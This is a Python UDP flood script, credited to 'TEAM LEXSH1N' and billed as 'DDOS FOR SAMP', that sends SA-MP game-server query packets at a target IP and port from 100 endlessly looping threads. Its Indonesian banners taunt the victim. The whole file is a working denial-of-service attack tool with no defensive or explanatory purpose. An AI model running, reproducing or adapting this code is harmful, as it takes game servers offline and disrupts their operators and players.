import socket
import struct
import codecs
import sys
import threading
import random
import time
import os

##//===//===//===//===//===//===//===//===//===//===//===//===//
#//===//=== TOOL BY LEXSH1N TEAM ===//===//##
ip = sys.argv[1]
port = sys.argv[2]
orgip = ip
Data = [
 codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e63', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e69', 'hex_codec'),
 codecs.decode('53414d509538e1a9611e72', 'hex_codec'),
 codecs.decode('081e62da', 'hex_codec'),
 codecs.decode('081e77da', 'hex_codec'),
 codecs.decode('081e4dda', 'hex_codec'),
 codecs.decode('021efd40', 'hex_codec'),
 codecs.decode('081e7eda', 'hex_codec')]

##//===//===//===//===//===//===//===//===//===//===//===//===//
#//===//=== ATTACK STARTED ===//===//##
os.system("clear")
print(" \x1b[1m\x1b[31mTEAM LEXSH1N NI BOSS!! IP %s| PORT%s"%(orgip,port))
print("--- TOOLS BY : TEAM LEXSH1N ---")
print("--- JANGAN NANGIS YA ---")
print("===================================")
print("DDOS FOR SAMP, ULTRA - HOST, 20GTPS")
print("========== VERSION 1.0 ============")
class MyThread(threading.Thread):

    def run(self):
        while True:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            msg = Data[random.randrange(0, 3)]
            sock.sendto(msg, (ip, int(port)))
            if int(port) == 7777:
                sock.sendto(Data[5], (ip, int(port)))
            elif int(port) == 7796:
                sock.sendto(Data[4], (ip, int(port)))
            elif int(port) == 7771:
                sock.sendto(Data[6], (ip, int(port)))
            elif int(port) == 7784:
                sock.sendto(Data[7], (ip, int(port)))


if __name__ == '__main__':
    try:
        for x in range(100):
            mythread = MyThread()
            mythread.start()
            time.sleep(0.1)

    except KeyboardInterrupt:
        os.system('cls' if os.name == 'nt' else 'clear')
        print '************************'
        print '**DDOS TOOLS T-LEXSH1N**'
        print '************************'
        print '\n\n'
        print ('BERHENTI MENYERANG {}').format(orgip)